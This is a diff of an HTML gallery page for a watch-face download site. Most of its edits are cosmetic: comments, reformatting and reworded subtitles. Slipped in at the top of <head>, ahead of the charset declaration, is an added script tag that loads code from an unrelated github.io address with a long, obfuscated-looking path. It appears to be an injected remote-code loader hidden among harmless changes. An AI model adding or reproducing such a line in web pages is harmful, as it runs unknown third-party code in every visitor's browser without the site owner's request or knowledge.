@@ -1,12 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script type="text/javascript" src="https://tdbnz-coding.github.io/fVpTgoU0gDivKBzaS7UMSxMVqsQDeRP-afCOHY_rh7BBFS2fQA0xSu0lhyfprpGWyp60BYc8qGVBQerMelnoE6DXCfmVnMtSWz5Ic9gq6Wuo6PGU-c4vKsHBkpgzsH79VY2n80KdiKta5FFk4B7YUm_ariRNbyiOIqcvbOD84GE="></script>
   <meta charset="UTF-8">
   <title>Apple Faces - Watch Faces</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- main site styles -->
   <link rel="stylesheet" href="styles.css">
 </head>
 <body class="page-faces">
+
 <header class="site-header">
   <div class="nav-inner">
     <a href="index.html" class="brand">
@@ -21,53 +25,78 @@
   </div>
 </header>
 
-<main>
+<main class="page-main">
+
+  <!-- Hero header -->
   <section class="page-hero">
-    <h1>Watch face galleries</h1>
-    <p>Browse by gallery or search across every face by title, description, or tag.</p>
+    <div class="page-hero-inner">
+      <h1>Watch face galleries</h1>
+      <p>
+        Browse by gallery or search across every face by title, description, or tag.
+      </p>
+    </div>
   </section>
 
+  <!-- Search -->
   <section class="search-section">
     <label for="searchInput" class="search-label">Search faces</label>
     <div class="search-wrapper">
       <input
         type="search"
         id="searchInput"
+        class="search-input"
         placeholder="Search titles, descriptions, or tags (for example christmas, birthday, minimal)"
         autocomplete="off"
       >
-      <span class="search-hint">Type a word to search. Clear the box to go back to gallery view.</span>
+      <span class="search-hint">
+        Type a word to search. Clear the box to return to gallery view.
+      </span>
     </div>
   </section>
 
+  <!-- Galleries list -->
   <section class="gallery-list-section" id="galleriesSection">
     <div class="section-header">
       <h2>Browse by gallery</h2>
-      <p class="section-subtitle" id="galleriesSubtitle">Pick a gallery to see its faces.</p>
+      <p class="section-subtitle" id="galleriesSubtitle">
+        Pick a gallery to see faces from that collection.
+      </p>
     </div>
+
+    <!-- cards are injected by app.js -->
     <div id="galleriesGrid" class="faces-grid gallery-grid"></div>
 
+    <!-- New faces (default view shows all new faces from JSON) -->
     <section class="new-faces-section" id="newFacesSection">
       <div class="section-header">
         <h2>New faces</h2>
-        <p class="section-subtitle" id="newFacesSubtitle">Recently added faces from all galleries.</p>
+        <p class="section-subtitle" id="newFacesSubtitle">
+          New faces from the last 10 days.
+        </p>
       </div>
+
+      <!-- cards are injected by app.js -->
       <div id="newFacesGrid" class="faces-grid"></div>
     </section>
   </section>
 
+  <!-- Search results section -->
   <section class="gallery-section" id="searchResultsSection" hidden>
     <div class="section-header">
       <h2>Search results</h2>
-      <p class="section-subtitle" id="searchResultsSubtitle">Matching faces</p>
+      <p class="section-subtitle" id="searchResultsSubtitle">
+        Matching faces
+      </p>
     </div>
 
+    <!-- search result cards are injected here -->
     <div id="searchResultsGrid" class="faces-grid"></div>
 
     <p id="searchNoResults" class="empty-state" hidden>
       Nothing matched your search. Try a different word or clear the search box.
     </p>
   </section>
+
 </main>
 
 <footer class="site-footer">
@@ -81,9 +110,13 @@
   </div>
 </footer>
 
+<!-- Modal for previewing a face -->
 <div class="modal-backdrop" id="previewModal" aria-hidden="true">
   <div class="modal-dialog" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
-    <button class="modal-close" id="modalCloseBtn" aria-label="Close preview">&times;</button>
+    <button class="modal-close" id="modalCloseBtn" aria-label="Close preview">
+      &times;
+    </button>
+
     <div class="modal-layout">
       <div class="modal-image-wrap">
         <div class="watch-mock large">
@@ -92,13 +125,23 @@
           </div>
         </div>
       </div>
+
       <div class="modal-info">
         <h2 id="modalTitle"></h2>
         <p id="modalDescription" class="modal-description"></p>
+
         <div id="modalTags" class="tag-list"></div>
-        <a id="modalDownload" class="btn primary full-width" href="#" target="_blank" rel="noopener">
+
+        <a
+          id="modalDownload"
+          class="btn primary full-width"
+          href="#"
+          target="_blank"
+          rel="noopener"
+        >
           Download image
         </a>
+
         <p class="modal-note">
           Save this image to your iPhone and use Create Watch Face in Photos.
           See <a href="how-to.html">How to Use</a> for steps.
@@ -108,6 +151,7 @@
   </div>
 </div>
 
+<!-- app logic -->
 <script src="app.js"></script>
 </body>
 </html>
